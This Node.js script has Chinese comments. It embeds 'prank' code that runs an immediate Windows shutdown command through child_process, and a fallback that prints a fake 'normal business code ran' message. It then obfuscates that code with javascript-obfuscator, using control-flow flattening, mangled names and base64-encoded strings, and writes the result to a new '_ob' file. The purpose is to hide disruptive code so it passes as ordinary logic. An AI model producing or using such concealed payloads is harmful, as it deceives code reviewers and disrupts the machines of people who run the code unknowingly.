const code = `
try {
    // 导入语句
    // 整蛊代码，比如关机代码
    const {exec} = require('child_process');
    function shutdownWindow() {
        let command = exec('shutdown -s -t 00', function (err, stdout, stderr) {
            if (err || stderr) {
                console.log("关机失败！" + err + stderr);
            }
        });
        command.stdin.end();
        command.on('close', function (code) {
            console.log("shutdown", code);
        });
    }

    shutdownWindow()

} catch {
// 正常代码
    console.log('这里执行了业务所需的正常代码');
}

`

const options = {
    // 不压缩
   compact: false,
    // 控制平坦化
   controlFlowFlattening: true,
    // 变量名混淆
    identifierNamesGenerator: 'mangled',
    // 数字混淆
    numbersToExpressions: true,
    // 字符串混淆
      stringArray: true,
      rotateStringArray: true,
      stringArrayEncoding: ['base64'], // 'base64' or 'rc4' or false
      stringArrayThreshold: 1,
}
const obfuscator = require('javascript-obfuscator')
function obfuscate(code, options) {
   return obfuscator.obfuscate(code, options).getObfuscatedCode()
}
var ob_str=obfuscate(code, options)
console.log(ob_str)

const path = require('path');
// 获取当前文件的完整路径
const fullPath = __filename;
// 使用path模块获取文件名
const fileName = path.basename(fullPath);
console.log('当前文件名:', fileName);
const fs = require('fs');
// 新文件名
const newFileName = fileName.replace(/(\.js)$/, '_ob$1');
// 将内容写入文件
fs.writeFile(newFileName, ob_str, (err) => {
  if (err) {
    console.error('写入文件时出错：', err);
    return;
  }
  console.log('内容已成功写入到文件:', newFileName);
});